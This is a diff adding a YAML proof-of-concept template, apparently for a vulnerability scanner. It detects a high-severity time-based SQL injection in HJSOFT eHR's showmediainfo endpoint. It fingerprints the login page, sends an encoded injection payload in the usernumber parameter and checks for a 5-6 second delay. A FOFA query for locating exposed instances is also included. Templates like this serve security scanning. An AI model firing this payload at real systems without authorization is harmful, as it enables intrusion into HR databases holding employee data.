@@ -1,0 +1,17 @@
+id: poc-yaml-hjsoft-ehr-showmediainfo-sqli
+info:
+  name: 宏景eHR showmediainfo SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 宏景eHR
+  fofa: app="HJSOFT-HCM"
+requests:
+- method: GET
+  path: /templates/index/hcmlogon.jsp
+  expression: status_code == 200 && contains(body,"/css/hcm/login.css")
+- method: GET
+  path: /workbench/duty/showmediainfo?kind=0&usernumber=1MV8sCtnMcsZFzLhJXUMPAATTP2HJFPAATTPVIRoUrFdir1XVNthrak35kPAATTP3HJDPAATTP&planid=1&objectid=1
+  expression: status_code == 200 && body == "" && duration > 5 && duration < 6
+variables: {}
+transport: http
